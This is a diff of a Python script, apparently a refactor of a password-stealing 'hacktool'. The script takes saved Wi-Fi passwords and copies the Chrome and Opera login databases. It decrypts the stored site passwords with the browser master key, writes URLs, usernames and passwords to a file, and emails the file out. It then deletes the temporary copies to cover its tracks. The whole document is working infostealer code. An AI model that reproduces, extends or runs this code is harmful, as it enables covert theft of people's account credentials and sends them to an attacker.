@@ -14,12 +14,11 @@ if checkNetwork() != True:
 operadb = "operadb.db"
 chromedb = 'chrome.db'
 
-path_login = r'AppData\Local\Google\Chrome\User Data\default\Login Data'
-
 if __name__ == '__main__':
     FROM_EMAIL = os.getenv('FROM_EMAIL')
     FROM_PASSWORD = os.getenv('FROM_PASSWORD')
     TO_EMAIL = os.getenv('TO_EMAIL')
+    LOGIN_PATH = os.getenv('LOGIN_PATH')
     
     vb = Vbscript(
         from_email=FROM_EMAIL,
@@ -37,9 +36,9 @@ if __name__ == '__main__':
         file.write(text)
         file.close()
 
-    vb.Get_Wifi_Password()
-    key_master = vb.getPassword()
-    login_db = os.environ['userprofile'] + os.sep + path_login
+    vb.wifi()
+    key_master = vb.get_password()
+    login_db = os.environ['userprofile'] + os.sep + LOGIN_PATH
     shutil.copy2(login_db, chromedb)
     connect = sqlite3.connect(chromedb)
     cursor = connect.cursor()
@@ -49,14 +48,14 @@ if __name__ == '__main__':
         url = item[0]
         username = item[1]
         encrypted_password = item[2]
-        decrypted_password = vb.decryptPassword(encrypted_password, key_master)
+        decrypted_password = vb.decrypt_password(encrypted_password, key_master)
         save = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n\n"
         with open('fuckyou.csv', 'a') as passwords:
             passwords.write(save)
             
-    # opera    
-    try:
-        key = vb.getEncryptionKey()
+    # opera 
+    try:    
+        key = vb.get_encryption_key()
         try:
             db_path = os.path.join(os.environ["userprofile"],"AppData", "Roaming", "Opera Software", "Opera Stable", "Login Data")
         except:
@@ -72,7 +71,7 @@ if __name__ == '__main__':
             origin_url = row[0]
             action_url = row[1]
             username = row[2]
-            password = vb.decryptPasswordOP(row[3], key)
+            password = vb.decrypt_password_OP(row[3], key)
             date_created = row[4]
             date_last_used = row[5]
             if username or password:
@@ -83,26 +82,23 @@ if __name__ == '__main__':
             else:
                 continue
             if date_created != 86400000000 and date_created:
-                file.write(f"Data: {str(vb.getChrome(date_created))}\n")
+                file.write(f"Data: {str(vb.get_chrome(date_created))}\n")
             if date_last_used != 86400000000 and date_last_used:
-                file.write(f"Última vez logado: {str(vb.getChrome(date_last_used))}\n")
+                file.write(f"Última vez logado: {str(vb.get_chrome(date_last_used))}\n")
             file.write("="*55)
         cursorOP.close()
         db.close()
         file.close()
-    except:
-        pass
-
-    vb.Send_Email()
+    except:...
+    
+    vb.send_email()
     cursor.close()
     connect.close()
     
 messagebox.showinfo(title='hacktool', message='Executado com Sucesso!')
 
-try:
-    if os.path.exists(chromedb):
-        os.remove(chromedb)
-    if os.path.exists(operadb):
-        os.remove(operadb)
-    os.remove('fuckyou.csv')
-except: ...
+if os.path.exists(chromedb):
+    os.remove(chromedb)
+if os.path.exists(operadb):
+    os.remove(operadb)
+os.remove('fuckyou.csv')
